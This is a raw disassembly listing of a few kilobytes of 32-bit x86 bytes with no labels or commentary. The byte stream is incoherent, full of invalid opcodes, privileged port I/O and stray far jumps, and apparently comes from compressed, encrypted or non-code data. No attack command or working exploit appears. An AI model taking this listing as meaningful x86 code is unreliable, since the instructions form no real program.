  41b9e4:	xchg   ecx,eax
  41b9e5:	imul   ecx,DWORD PTR [edx-0x61287260],0xffffff88
  41b9ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b9ed:	cmp    ebp,DWORD PTR [edi+ebp*8-0x72e38606]
  41b9f4:	cmp    edx,DWORD PTR [edi-0x58]
  41b9f7:	(bad)  
  41b9f8:	fidivr WORD PTR [eax-0x7a]
  41b9fb:	dec    ebp
  41b9fc:	aad    0x0
  41b9fe:	sub    eax,0x986ae199
  41ba03:	sbb    BYTE PTR [ecx+0x7f],cl
  41ba06:	imul   eax,esp,0x1f863592
  41ba0c:	stos   BYTE PTR es:[edi],al
  41ba0d:	push   ds
  41ba0e:	adc    DWORD PTR [edx],ebx
  41ba10:	and    eax,0xf30498ae
  41ba15:	xchg   BYTE PTR [ebx-0x74b8f79],ch
  41ba1b:	push   ebx
  41ba1c:	retf   
  41ba1d:	sbb    esi,DWORD PTR [ebp+0x70]
  41ba20:	cli    
  41ba21:	mov    dh,0x46
  41ba23:	js     0x41b9ab
  41ba25:	in     al,dx
  41ba26:	fs std 
  41ba28:	push   esi
  41ba29:	aam    0x5f
  41ba2b:	fdivr  st(2),st
  41ba2d:	shl    DWORD PTR [edx+ebp*1+0x67820cd7],0x9b
  41ba35:	stos   BYTE PTR es:[edi],al
  41ba36:	aaa    
  41ba37:	push   DWORD PTR [eax+0x13274cba]
  41ba3d:	fiadd  WORD PTR ds:0x32ae1518
  41ba43:	rcl    BYTE PTR [ebx+0x25cb0aa7],cl
  41ba49:	arpl   di,si
  41ba4b:	lds    eax,FWORD PTR [edx-0x76]
  41ba4e:	aam    0x81
  41ba50:	fnstsw WORD PTR [edi+0x4f054ef7]
  41ba56:	fdiv   DWORD PTR [ecx*1-0x157174ee]
  41ba5d:	jg     0x41ba0c
  41ba5f:	push   0x1e
  41ba61:	shl    BYTE PTR [eax-0x6a],0x41
  41ba65:	cmc    
  41ba66:	mov    bl,0x9
  41ba68:	ucomiss xmm1,xmm2
  41ba6b:	cmp    al,0x1
  41ba6d:	jl     0x41ba18
  41ba6f:	repz and al,0xea
  41ba72:	jmp    0x41ba67
  41ba74:	fst    QWORD PTR [ecx-0x7b25c716]
  41ba7a:	(bad)  
  41ba7b:	out    0x39,al
  41ba7d:	ins    BYTE PTR es:[edi],dx
  41ba7e:	xchg   edi,eax
  41ba7f:	retf   0xdbec
  41ba82:	test   eax,0x5fb1ddb6
  41ba87:	xor    ah,BYTE PTR [ebp+0x6ef7c28]
  41ba8d:	retf   
  41ba8e:	stc    
  41ba8f:	and    BYTE PTR [edi-0x69],dh
  41ba92:	jb     0x41ba57
  41ba94:	sbb    eax,0x8accf469
  41ba99:	mov    al,ds:0x812017ca
  41ba9e:	repnz mov eax,0x11a5a782
  41baa4:	push   ds
  41baa5:	push   0x21
  41baa7:	mov    al,ds:0xfb50b8
  41baac:	dec    eax
  41baad:	(bad)  [ebx+eiz*2-0x29]
  41bab1:	pop    esp
  41bab2:	jmp    0x88b6:0xacfeb37a
  41bab9:	and    edi,0x458154ea
  41babf:	jecxz  0x41bb16
  41bac1:	(bad)  
  41bac2:	lahf   
  41bac3:	mov    eax,0x915946ec
  41bac8:	xor    esp,ebp
  41baca:	adc    DWORD PTR [edi+0x16],0xffffff98
  41bace:	call   0x3617:0x849d3d40
  41bad5:	xor    al,0xfd
  41bad7:	mov    ebp,0x3acd3531
  41badc:	stc    
  41badd:	sbb    ch,bl
  41badf:	mov    WORD PTR [edx],es
  41bae1:	outs   dx,DWORD PTR ds:[esi]
  41bae2:	jne    0x41baf8
  41bae4:	add    edi,DWORD PTR [ebp-0x5efa0815]
  41baea:	xor    ecx,DWORD PTR [esi+0x30dbadaa]
  41baf0:	aam    0xad
  41baf2:	xchg   ecx,eax
  41baf3:	sub    al,BYTE PTR [ebx-0x47f71ab7]
  41baf9:	mov    ah,0xc5
  41bafb:	out    0xd3,al
  41bafd:	jae    0x41bb77
  41baff:	and    BYTE PTR [ecx+0x2ae8a929],al
  41bb05:	stc    
  41bb06:	loop   0x41bb81
  41bb08:	mov    al,ds:0x6d0583f7
  41bb0d:	ret    0xbe1b
  41bb10:	jl     0x41bb11
  41bb12:	stc    
  41bb13:	add    DWORD PTR [ebp-0x31c26ea4],ecx
  41bb19:	sbb    al,0x8e
  41bb1b:	jmp    0x41bb25
  41bb1d:	fcmovu st,st(2)
  41bb1f:	push   es
  41bb20:	mov    al,ds:0xf52c5cca
  41bb25:	arpl   WORD PTR [ebx-0x6a2f8f4a],bp
  41bb2b:	out    0xd6,al
  41bb2d:	adc    edx,edi
  41bb2f:	pop    ebx
  41bb30:	arpl   WORD PTR [ecx-0x54c05833],si
  41bb36:	push   edx
  41bb37:	xchg   edi,eax
  41bb38:	jmp    edi
  41bb3a:	cmp    al,0x2d
  41bb3c:	and    BYTE PTR [edi],ah
  41bb3e:	cs inc ecx
  41bb40:	add    al,0x7e
  41bb42:	sbb    ch,BYTE PTR [edi-0x67]
  41bb45:	fdivr  DWORD PTR [edi+ebp*4+0x67076286]
  41bb4c:	jecxz  0x41bb17
  41bb4e:	out    0x54,eax
  41bb50:	cs push ebx
  41bb52:	mov    DWORD PTR [esi-0x322b4567],esi
  41bb58:	push   edx
  41bb59:	fild   DWORD PTR [eax]
  41bb5b:	mov    ebx,0x99c44d9b
  41bb60:	iret   
  41bb61:	in     al,0x61
  41bb63:	inc    esi
  41bb64:	stc    
  41bb65:	shl    DWORD PTR [edx-0x44859c2d],cl
  41bb6b:	mov    ?,WORD PTR [edi+0x3c]
  41bb6e:	rcr    DWORD PTR [edi-0x4bb280ae],0xed
  41bb75:	or     eax,0x26f27aaa
  41bb7a:	mov    bh,0x27
  41bb7c:	jge    0x41bb24
  41bb7e:	dec    eax
  41bb7f:	xchg   ebx,eax
  41bb80:	shl    DWORD PTR [edx+ecx*1-0x5ff51448],0x8b
  41bb88:	pop    esi
  41bb89:	in     eax,0x41
  41bb8b:	aad    0x49
  41bb8d:	fst    DWORD PTR [esi+0x72]
  41bb90:	je     0x41bbd0
  41bb92:	xchg   esi,eax
  41bb93:	das    
  41bb94:	xor    ebx,edx
  41bb96:	in     eax,0x45
  41bb98:	inc    eax
  41bb99:	xchg   ecx,eax
  41bb9a:	(bad)  ds:0x7478a5d1
  41bba0:	mov    bl,0xcc
  41bba2:	mov    ds:0x1e5f0d42,eax
  41bba7:	add    BYTE PTR [ebx-0x75],dl
  41bbaa:	test   eax,0xb9a24d21
  41bbaf:	clc    
  41bbb0:	add    BYTE PTR [ecx-0x5aad9aaf],dh
  41bbb6:	ror    DWORD PTR [eax+0x72],1
  41bbb9:	mov    eax,0x8d109e79
  41bbbe:	dec    esp
  41bbbf:	rol    bl,cl
  41bbc1:	imul   esp,DWORD PTR [edx+ecx*1],0x9eea9553
  41bbc8:	xor    ebx,DWORD PTR [ecx+0x2d]
  41bbcb:	jne    0x41bc0f
  41bbcd:	mov    BYTE PTR ds:0xf773946f,ah
  41bbd3:	ins    DWORD PTR es:[edi],dx
  41bbd4:	pop    ss
  41bbd5:	sbb    DWORD PTR [ecx-0x32],ecx
  41bbd8:	xor    ebp,DWORD PTR [edx+0x3e]
  41bbdb:	jle    0x41bb9c
  41bbdd:	aas    
  41bbde:	out    0x5e,eax
  41bbe0:	stc    
  41bbe1:	mov    edx,0xe6b250d5
  41bbe6:	mov    cl,0x46
  41bbe8:	sbb    esi,DWORD PTR [eax]
  41bbea:	push   cs
  41bbeb:	and    edi,edx
  41bbed:	sti    
  41bbee:	xor    DWORD PTR [esi+edx*8-0x61],edi
  41bbf2:	jne    0x41bc38
  41bbf4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bbf5:	sbb    eax,0xf52afab1
  41bbfa:	push   edx
  41bbfb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bbfc:	adc    eax,0x23356b03
  41bc01:	aas    
  41bc02:	adc    BYTE PTR [esi],ch
  41bc04:	je     0x41bc15
  41bc06:	sbb    ebx,0xffffff82
  41bc09:	leave  
  41bc0a:	jg     0x41bc86
  41bc0c:	xchg   ebp,eax
  41bc0d:	xchg   bh,dh
  41bc0f:	mov    edx,gs
  41bc11:	mov    ecx,0xc6fca80e
  41bc16:	pop    esi
  41bc17:	loopne 0x41bc69
  41bc19:	cmp    bl,BYTE PTR [ecx+0x5ef18468]
  41bc1f:	loope  0x41bbe2
  41bc21:	iret   
  41bc22:	push   cs
  41bc23:	sbb    al,0x6f
  41bc25:	ret    
  41bc26:	add    BYTE PTR [ebp-0x5e4071ad],bl
  41bc2c:	cdq    
  41bc2d:	call   ebx
  41bc2f:	out    0xd3,eax
  41bc31:	aaa    
  41bc32:	jb     0x41bc2c
  41bc34:	jge    0x41bc8a
  41bc36:	(bad)  
  41bc37:	adc    ebx,DWORD PTR [esi]
  41bc39:	out    0x95,al
  41bc3b:	inc    esp
  41bc3c:	mov    ch,BYTE PTR [esi+0x39]
  41bc3f:	adc    edi,edi
  41bc41:	or     esi,edi
  41bc43:	hlt    
  41bc44:	retf   0x1e74
  41bc47:	jmp    0x41bc01
  41bc49:	pop    esp
  41bc4a:	in     eax,0x61
  41bc4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc4d:	dec    ebp
  41bc4e:	data16 daa 
  41bc50:	mov    eax,ds:0x79417fb8
  41bc55:	dec    edi
  41bc56:	mov    bh,0x40
  41bc58:	dec    ecx
  41bc59:	les    eax,FWORD PTR [ecx]
  41bc5b:	mov    es,WORD PTR [ebx-0x3a49fd52]
  41bc61:	mov    ebx,0xfe2411ce
  41bc66:	add    eax,0x1f38bbf4
  41bc6b:	add    eax,0xe8fa8a20
  41bc70:	or     eax,0xb97835e4
  41bc75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc76:	cmp    eax,0xf1bfa760
  41bc7b:	add    ecx,eax
  41bc7d:	mov    ah,0xe1
  41bc7f:	jnp    0x41bcc3
  41bc81:	pop    esp
  41bc82:	ror    ebx,0x2d
  41bc85:	pop    ds
  41bc86:	bound  ebx,QWORD PTR [edi+ecx*4-0x55b8585a]
  41bc8d:	sbb    dh,BYTE PTR [eax+0x8ace27a]
  41bc93:	add    esi,DWORD PTR [edx+0x52]
  41bc96:	sbb    BYTE PTR [edx+0x786b955a],bl
  41bc9c:	push   ss
  41bc9d:	lds    ecx,FWORD PTR [esi+0x2e]
  41bca0:	stos   BYTE PTR es:[edi],al
  41bca1:	or     esp,DWORD PTR [ebx+0x37528804]
  41bca7:	out    dx,eax
  41bca8:	imul   ecx,esi,0xffffff92
  41bcab:	repnz nop
  41bcad:	mov    cl,BYTE PTR [edx+0x5efc86a]
  41bcb3:	adc    al,0x33
  41bcb6:	bound  edi,QWORD PTR [edx-0x38]
  41bcb9:	or     esp,ebp
  41bcbb:	sub    cl,ch
  41bcbd:	cdq    
  41bcbe:	add    bh,BYTE PTR [edx+0x1c3f421d]
  41bcc4:	jge    0x41bd28
  41bcc6:	fldl2e 
  41bcc8:	imul   edi,edi,0xffffff86
  41bccb:	in     al,0xa7
  41bccd:	cmp    DWORD PTR [eax-0xa],eax
  41bcd0:	div    DWORD PTR es:[ebp-0x5d8e63b8]
  41bcd7:	push   ecx
  41bcd8:	cmp    ebx,DWORD PTR [esi-0x7dfcef08]
  41bcde:	lahf   
  41bcdf:	popa   
  41bce0:	aad    0x40
  41bce2:	sbb    eax,esp
  41bce4:	pop    ebx
  41bce5:	ins    DWORD PTR es:[edi],dx
  41bce6:	push   esp
  41bce7:	xor    dh,bh
  41bce9:	pop    ebp
  41bcea:	or     ebx,DWORD PTR [edx+0x7d]
  41bced:	jmp    0x3d7f:0x6df37c7f
  41bcf4:	cmp    edx,DWORD PTR [ecx+0x7c08a187]
  41bcfa:	fsub   QWORD PTR [eax-0x3]
  41bcfd:	mov    ebx,0x25506296
  41bd02:	inc    esp
  41bd03:	jg     0x41bd5e
  41bd05:	scas   eax,DWORD PTR es:[edi]
  41bd06:	mov    eax,0x78f64132
  41bd0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd0c:	push   es
  41bd0d:	sbb    esi,ebp
  41bd0f:	sub    eax,0xb6f84561
  41bd14:	mov    esp,0x974a13f1
  41bd19:	mov    ss,esi
  41bd1b:	xchg   ebx,eax
  41bd1c:	pop    ecx
  41bd1d:	add    bh,BYTE PTR [ecx-0x2a9b1420]
  41bd23:	xchg   edi,eax
  41bd24:	jae    0x41bd41
  41bd26:	imul   ebp,eax,0xffffffb1
  41bd29:	sbb    eax,0x70a339ab
  41bd2e:	in     al,dx
  41bd2f:	jp     0x41bd89
  41bd31:	sahf   
  41bd32:	xor    al,0x91
  41bd34:	jb     0x41bd79
  41bd36:	leave  
  41bd37:	stc    
  41bd38:	sub    eax,0xf4e7c907
  41bd3d:	push   ebx
  41bd3e:	ins    DWORD PTR es:[edi],dx
  41bd3f:	stc    
  41bd40:	icebp  
  41bd41:	into   
  41bd42:	xor    esi,DWORD PTR [esi+0x75f8984d]
  41bd48:	or     al,BYTE PTR [edi]
  41bd4a:	test   BYTE PTR [ebx-0x44f83a98],ah
  41bd50:	xchg   BYTE PTR [esi-0x787a49da],bl
  41bd56:	outs   dx,DWORD PTR ds:[esi]
  41bd57:	lea    ebx,[ecx]
  41bd59:	sbb    bl,BYTE PTR [eax+0x274dcee0]
  41bd5f:	ret    
  41bd60:	mov    cl,0x41
  41bd62:	push   0xffffff9c
  41bd64:	es mov bl,0x38
  41bd67:	loopne 0x41bd98
  41bd69:	or     al,0x24
  41bd6b:	push   es
  41bd6c:	or     DWORD PTR [eax+0x6f1a585a],edi
  41bd72:	pop    edi
  41bd73:	xchg   ebp,eax
  41bd74:	pop    ds
  41bd75:	jno    0x41bda6
  41bd77:	fidivr WORD PTR [esi+0x3f725a0b]
  41bd7d:	iret   
  41bd7e:	xor    eax,0x618bc072
  41bd83:	add    eax,0xfd92ff27
  41bd88:	and    dh,BYTE PTR [ecx+0x69]
  41bd8b:	iret   
  41bd8c:	or     ebp,DWORD PTR [eax+0x22]
  41bd8f:	add    al,0x53
  41bd91:	jb     0x41bd37
  41bd93:	iret   
  41bd94:	loop   0x41bdf2
  41bd96:	and    BYTE PTR [esi],dh
  41bd98:	push   edi
  41bd99:	hlt    
  41bd9a:	add    al,0xc0
  41bd9c:	ret    0x4d65
  41bd9f:	push   0x2fa1f83a
  41bda4:	mov    ah,0xc4
  41bda6:	pop    edi
  41bda7:	sub    bl,cl
  41bda9:	lods   al,BYTE PTR ds:[esi]
  41bdaa:	pop    ss
  41bdab:	iret   
  41bdac:	or     BYTE PTR [ecx],bl
  41bdae:	mov    DWORD PTR [edx],eax
  41bdb0:	sti    
  41bdb1:	fsubr  st,st(4)
  41bdb3:	cmp    eax,0xa0fc8430
  41bdb8:	sar    cl,1
  41bdba:	mov    dl,0x89
  41bdbc:	cli    
  41bdbd:	mov    dh,0xc5
  41bdbf:	or     esi,DWORD PTR [ebp-0x3b]
  41bdc2:	mov    edi,0xdcbcfd30
  41bdc7:	daa    
  41bdc8:	repnz and cl,BYTE PTR [eax+0x42]
  41bdcc:	push   ebx
  41bdcd:	jecxz  0x41bdab
  41bdcf:	fwait
  41bdd0:	bound  esi,QWORD PTR [ecx+eiz*4+0x64]
  41bdd4:	mov    eax,ds:0x657b699e
  41bdd9:	aaa    
  41bdda:	test   DWORD PTR [ebx+ebp*2+0x15],edx
  41bdde:	jnp    0x41bdbe
  41bde0:	shr    BYTE PTR [ebx+edi*8],0x8e
  41bde4:	dec    ebp
  41bde5:	mov    cl,0x71
  41bde7:	sti    
  41bde8:	xchg   edi,eax
  41bde9:	cmp    ebp,ecx
  41bdeb:	jo     0x41be39
  41bded:	jmp    0x41bd79
  41bdef:	push   ecx
  41bdf0:	in     al,0x1b
  41bdf2:	mov    ebx,0x55cbbdda
  41bdf7:	out    dx,al
  41bdf8:	add    BYTE PTR [ecx-0x39d0e2d],dh
  41bdfe:	sub    dh,0x65
  41be01:	xchg   edi,eax
  41be02:	or     esi,ebp
  41be04:	sbb    eax,0x788d5d4a
  41be09:	jae    0x41be71
  41be0b:	fmul   QWORD PTR [esi]
  41be0d:	rcl    DWORD PTR cs:[eax+edx*8+0x5bae0efe],0x18
  41be16:	rol    BYTE PTR [edx+ebx*2+0x41],cl
  41be1a:	icebp  
  41be1b:	loopne 0x41bdea
  41be1d:	je     0x41be05
  41be1f:	out    dx,eax
  41be20:	js     0x41be87
  41be22:	push   eax
  41be23:	out    dx,al
  41be24:	dec    ebx
  41be25:	dec    ecx
  41be26:	pusha  
  41be27:	(bad)  
  41be28:	inc    DWORD PTR [edi+0x18276b94]
  41be2e:	xlat   BYTE PTR ds:[ebx]
  41be2f:	fisttp WORD PTR [ebx-0x4fcb4259]
  41be35:	sar    BYTE PTR [eax],1
  41be37:	mov    cl,0xf2
  41be39:	add    esp,DWORD PTR ds:0x4cdd911
  41be3f:	enter  0x4029,0xc2
  41be43:	sub    cl,BYTE PTR [esi-0x39]
  41be46:	cmp    al,0xba
  41be48:	int3   
  41be49:	jo     0x41be63
  41be4b:	retf   0x755b
  41be4e:	cmp    ebx,DWORD PTR [ebp-0x5e]
  41be51:	cmc    
  41be52:	aad    0xdd
  41be54:	pop    esi
  41be55:	aam    0x93
  41be57:	cmp    DWORD PTR [ebx],0x5f
  41be5a:	push   esi
  41be5b:	das    
  41be5c:	not    BYTE PTR [ebp-0x7d4879df]
  41be62:	dec    eax
  41be63:	jmp    0xde4f:0x32c026e3
  41be6a:	adc    al,0x57
  41be6c:	mov    bl,0x1d
  41be6e:	push   edi
  41be6f:	shl    BYTE PTR [edx+0x62],cl
  41be72:	sbb    bh,ah
  41be74:	pushf  
  41be75:	rcr    BYTE PTR gs:[edx],0xf4
  41be79:	repz scas al,BYTE PTR es:[edi]
  41be7b:	popa   
  41be7c:	or     ecx,DWORD PTR [eax+0x0]
  41be7f:	repnz or BYTE PTR [ebp-0xc],ch
  41be83:	cmp    al,0x90
  41be85:	push   es
  41be86:	cld    
  41be87:	(bad)  
  41be88:	pusha  
  41be89:	xor    eax,0x90ea10b7
  41be8e:	jbe    0x41be50
  41be90:	jmp    DWORD PTR [eax]
  41be92:	xchg   ebp,eax
  41be93:	mov    ah,0xa
  41be95:	ret    0x7a1b
  41be98:	jnp    0x41be47
  41be9a:	add    dh,dl
  41be9c:	and    BYTE PTR [ecx],al
  41be9e:	add    eax,0xbcca2a78
  41bea3:	aas    
  41bea4:	enter  0x3853,0xdb
  41bea8:	and    bl,dh
  41beaa:	ret    0x4ec2
  41bead:	push   cs
  41beae:	sub    BYTE PTR [eax],dl
  41beb0:	xchg   esp,eax
  41beb1:	sbb    BYTE PTR [eax-0x4e7ab2cd],ch
  41beb7:	and    eax,0x5ac3283a
  41bebc:	call   0x528c:0xdef3c822
  41bec3:	stos   DWORD PTR es:[edi],eax
  41bec4:	mov    al,ds:0x6a295266
  41bec9:	retf   0x52c8
  41becc:	rcl    BYTE PTR ds:0xf267af3b,0xc8
  41bed3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bed4:	jns    0x41bf28
  41bed6:	sub    eax,0xc5f5a38e
  41bedb:	cmp    BYTE PTR [ecx-0x2768a234],cl
  41bee1:	xchg   esi,eax
  41bee2:	out    0xa1,al
  41bee4:	jle    0x41bee1
  41bee6:	jnp    0x41bf5b
  41bee8:	es pop ebx
  41beea:	stos   BYTE PTR es:[edi],al
  41beeb:	push   ebx
  41beec:	cmp    BYTE PTR [eax],al
  41beee:	jne    0x41bebe
  41bef0:	aam    0x66
  41bef2:	sahf   
  41bef3:	mov    ebx,DWORD PTR [esi+ebx*4]
  41bef6:	loop   0x41beb8
  41bef8:	jo     0x41be88
  41befa:	pop    ss
  41befb:	mov    eax,0x8e50599c
  41bf00:	arpl   WORD PTR [eax+0x1798c3d4],ax
  41bf06:	je     0x41bf57
  41bf08:	push   esi
  41bf09:	inc    esp
  41bf0a:	aaa    
  41bf0b:	pushw  es
  41bf0d:	mov    ebx,es
  41bf0f:	into   
  41bf10:	das    
  41bf11:	fidivr WORD PTR [ebp-0x55a32a51]
  41bf17:	xchg   ebp,eax
  41bf18:	cli    
  41bf19:	jb     0x41beef
  41bf1b:	in     al,dx
  41bf1c:	icebp  
  41bf1d:	sbb    eax,0x2669657a
  41bf22:	aad    0x84
  41bf24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf25:	sub    cl,BYTE PTR [edx]
  41bf27:	sub    esp,DWORD PTR [ebx-0x51b5e2ed]
  41bf2d:	pop    edx
  41bf2e:	mov    edx,0x90b225ac
  41bf33:	imul   edx
  41bf35:	mov    bl,0x17
  41bf37:	push   ecx
  41bf38:	test   al,0xed
  41bf3a:	clc    
  41bf3b:	in     eax,0xa3
  41bf3d:	sbb    DWORD PTR [edi-0x5b],eax
  41bf40:	pop    esi
  41bf41:	jo     0x41bef8
  41bf43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf44:	loopne 0x41bf11
  41bf46:	sar    edi,0x57
  41bf49:	xor    eax,0x550ee5ff
  41bf4e:	(bad)  
  41bf4f:	push   0xffffff97
  41bf51:	shl    BYTE PTR [ecx-0x42],1
  41bf54:	cmp    DWORD PTR [eax-0x2979aae1],0x87c0522b
  41bf5e:	cwde   
  41bf5f:	in     eax,dx
  41bf60:	xor    al,0x25
  41bf62:	data16 mov bl,0x8
  41bf65:	ins    DWORD PTR es:[edi],dx
  41bf66:	stos   BYTE PTR es:[edi],al
  41bf67:	jns    0x41bf7d
  41bf69:	pop    edi
  41bf6a:	xor    ebx,DWORD PTR [ecx]
  41bf6c:	and    al,0x65
  41bf6e:	in     al,dx
  41bf6f:	in     eax,dx
  41bf70:	jo     0x41bf5a
  41bf72:	pusha  
  41bf73:	out    dx,eax
  41bf74:	out    0x1c,eax
  41bf76:	inc    ebp
  41bf77:	push   ebp
  41bf78:	adc    BYTE PTR [ecx-0x2f],0xf0
  41bf7c:	ins    BYTE PTR es:[edi],dx
  41bf7d:	les    ebp,FWORD PTR gs:[edi-0x38e93b61]
  41bf84:	or     cl,0x63
  41bf87:	and    al,0x7b
  41bf89:	xor    edx,DWORD PTR [edi-0x5a50da8a]
  41bf8f:	and    al,BYTE PTR [ecx]
  41bf91:	mov    cl,0x73
  41bf93:	test   al,0x5d
  41bf95:	jmp    0x41bff9
  41bf97:	add    BYTE PTR [esi+0x35],0x9f
  41bf9b:	mov    eax,ds:0xb6454729
  41bfa0:	jg     0x41bf9c
  41bfa2:	leave  
  41bfa3:	add    eax,0x26126295
  41bfa8:	(bad)  ds:0x3658f0bf
  41bfae:	(bad)  
  41bfaf:	mov    al,ds:0xa6bc1f07
  41bfb4:	xchg   edx,eax
  41bfb5:	or     esp,edi
  41bfb7:	mov    es,WORD PTR [ebp-0x1cf8bec4]
  41bfbd:	pop    esi
  41bfbe:	mov    fs,WORD PTR [ebx]
  41bfc0:	mov    edi,DWORD PTR [ecx]
  41bfc2:	pop    esi
  41bfc3:	adc    ecx,DWORD PTR [ebp+0x1e]
  41bfc6:	and    ebp,edi
  41bfc8:	xchg   edx,eax
  41bfc9:	sub    al,BYTE PTR [edi]
  41bfcb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bfcc:	fwait
  41bfcd:	pop    ecx
  41bfce:	es xchg ecx,eax
  41bfd0:	xchg   edi,ebx
  41bfd2:	test   al,0x4c
  41bfd4:	jg     0x41bfbe
  41bfd6:	adc    eax,0xffffffc1
  41bfd9:	loope  0x41bfa1
  41bfdb:	and    BYTE PTR [edx+0x78c494bc],cl
  41bfe1:	iret   
  41bfe2:	ja     0x41bfd7
  41bfe4:	les    edi,FWORD PTR [eax+0x6f39a168]
  41bfea:	jle    0x41bfae
  41bfec:	dec    edi
  41bfed:	sti    
  41bfee:	xor    eax,0xdd676ca
  41bff3:	ror    BYTE PTR [ebp+0xe],1
  41bff6:	and    DWORD PTR ds:0x9d445b1b,edi
  41bffc:	add    eax,0xe4208b4f
  41c001:	imul   eax,DWORD PTR [ebx],0x85122f8c
  41c007:	out    0x72,al
  41c009:	jns    0x41bfcc
  41c00b:	xchg   esi,eax
  41c00c:	xor    dl,dl
  41c00e:	xor    DWORD PTR [ebx+0x1d],esi
  41c011:	shr    DWORD PTR [ebx+edx*8+0x7f83ed1b],0xcc
  41c019:	mov    DWORD PTR [esp+edx*1+0x75758336],esi
  41c020:	pop    esp
  41c021:	call   0xcac39e23
  41c026:	rcr    BYTE PTR [eax+eiz*2],cl
  41c029:	jno    0x41bfd8
  41c02b:	imul   eax,DWORD PTR [ebp+0x34],0x3a3a1916
  41c032:	(bad)  
  41c033:	aas    
  41c034:	pop    esi
  41c035:	xchg   ebp,eax
  41c037:	jmp    0x41c02c
  41c039:	popw   ss
  41c03b:	int    0x44
  41c03d:	sbb    BYTE PTR [ecx+0x1b3d4ccb],dl
  41c043:	clc    
  41c044:	and    ebx,DWORD PTR [ecx-0x31]
  41c047:	xor    al,0xce
  41c049:	dec    edx
  41c04a:	mov    esi,DWORD PTR ss:[ebp+0x37321e32]
  41c051:	mov    al,ds:0xc19d9c50
  41c056:	inc    edi
  41c057:	pop    ecx
  41c058:	inc    ebp
  41c059:	push   0x78
  41c05b:	cli    
  41c05c:	cmc    
  41c05d:	or     al,0xf1
  41c05f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c060:	fninit 
  41c062:	xlat   BYTE PTR ds:[ebx]
  41c063:	das    
  41c064:	or     eax,0xf612b648
  41c069:	call   FWORD PTR [ecx+eiz*1+0x39]
  41c06d:	cmp    edx,esi
  41c06f:	rcr    DWORD PTR [esi-0x62],cl
  41c072:	ins    BYTE PTR es:[edi],dx
  41c073:	mov    ebx,0x43db13f6
  41c078:	cmp    eax,DWORD PTR [eax]
  41c07a:	jmp    0xa0bc:0x8edbcacc
  41c081:	pop    esp
  41c082:	mov    edi,DWORD PTR [eax+ebp*1-0x2d]
  41c086:	jmp    0x41c0df
  41c088:	or     ch,bl
  41c08a:	retf   
  41c08b:	dec    esp
  41c08c:	xor    bl,BYTE PTR [esi]
  41c08e:	or     DWORD PTR [esp+ecx*4],esi
  41c091:	stos   BYTE PTR es:[edi],al
  41c092:	inc    BYTE PTR [ecx+0x1c25939d]
  41c098:	ss push eax
  41c09a:	cmp    DWORD PTR [ebx-0x4074f8e1],esi
  41c0a0:	cmp    al,0x0
  41c0a2:	add    eax,0xff2f0083
  41c0a7:	adc    BYTE PTR [esi+ebx*1-0x53f3ebae],dl
  41c0ae:	dec    eax
  41c0af:	popf   
  41c0b0:	push   0x72
  41c0b2:	sbb    eax,0x26eea1fe
  41c0b7:	scas   eax,DWORD PTR es:[edi]
  41c0b8:	sub    al,0x8a
  41c0ba:	cmp    edx,DWORD PTR [ecx-0x57]
  41c0bd:	imul   BYTE PTR [edx]
  41c0bf:	scas   al,BYTE PTR es:[edi]
  41c0c0:	xchg   DWORD PTR [ecx*2+0x108f13ea],ebp
  41c0c7:	addr16 ret 0x9809
  41c0cb:	add    al,0xd9
  41c0cd:	mov    bl,BYTE PTR [ebp+0x70d08640]
  41c0d3:	sub    eax,0xbd0d4ac
  41c0d8:	mov    ss,WORD PTR [ebp+0x1c]
  41c0db:	mov    edi,0x87a31c7
  41c0e0:	xchg   BYTE PTR [edi],al
  41c0e2:	daa    
  41c0e3:	push   eax
  41c0e4:	fcom   QWORD PTR [ebx]
  41c0e6:	outs   dx,DWORD PTR ds:[esi]
  41c0e7:	dec    edi
  41c0e8:	add    eax,DWORD PTR [eax*1-0x58e171c9]
  41c0ef:	push   ss
  41c0f0:	call   0xe79e:0xdbcafdde
  41c0f7:	rcl    esi,1
  41c0f9:	jbe    0x41c0f7
  41c0fb:	stos   BYTE PTR es:[edi],al
  41c0fc:	sbb    ebp,DWORD PTR [esi+ebp*8]
  41c0ff:	ret    0x32ce
  41c102:	sub    al,0x81
  41c104:	cmp    al,BYTE PTR [esi]
  41c106:	inc    ecx
  41c107:	enter  0x67c2,0xc
  41c10b:	sub    ah,BYTE PTR [eax]
  41c10d:	and    eax,0xa547edae
  41c112:	jmp    0xf8d3d513
  41c117:	jge    0x41c136
  41c119:	cmp    BYTE PTR [ebx+ebp*8-0x25],al
  41c11d:	sar    ah,cl
  41c11f:	cmp    al,0x13
  41c121:	dec    ebp
  41c122:	inc    edi
  41c123:	aad    0x34
  41c125:	pop    edx
  41c126:	pop    esp
  41c127:	jle    0x41c0d0
  41c129:	pop    edi
  41c12a:	test   eax,0x602cd849
  41c12f:	xchg   esp,eax
  41c130:	ins    DWORD PTR es:[edi],dx
  41c131:	add    edx,DWORD PTR [eax]
  41c133:	mov    al,0x3b
  41c135:	mov    BYTE PTR [eax+ecx*8],dh
  41c138:	jns    0x41c0c0
  41c13a:	or     ecx,DWORD PTR [edi+ecx*4+0x326aebc8]
  41c141:	inc    ebx
  41c142:	stos   BYTE PTR es:[edi],al
  41c143:	aam    0x6
  41c145:	or     eax,0xb61838de
  41c14a:	fdivr  QWORD PTR [ebx+0x17]
  41c14d:	dec    esp
  41c14e:	in     al,0x38
  41c150:	cld    
  41c151:	(bad)  
  41c152:	mov    ebp,0x9923ef9e
  41c157:	retf   
  41c158:	mov    eax,0x64ca4dfd
  41c15d:	std    
  41c15e:	add    al,0xcf
  41c160:	or     BYTE PTR [eax],cl
  41c162:	or     DWORD PTR [edi],ebp
  41c164:	mov    WORD PTR [ebp+0x537349f9],ss
  41c16a:	jge    0x41c18b
  41c16c:	jge    0x41c16a
  41c16e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c16f:	xchg   edi,eax
  41c170:	fst    QWORD PTR [ebx-0x71]
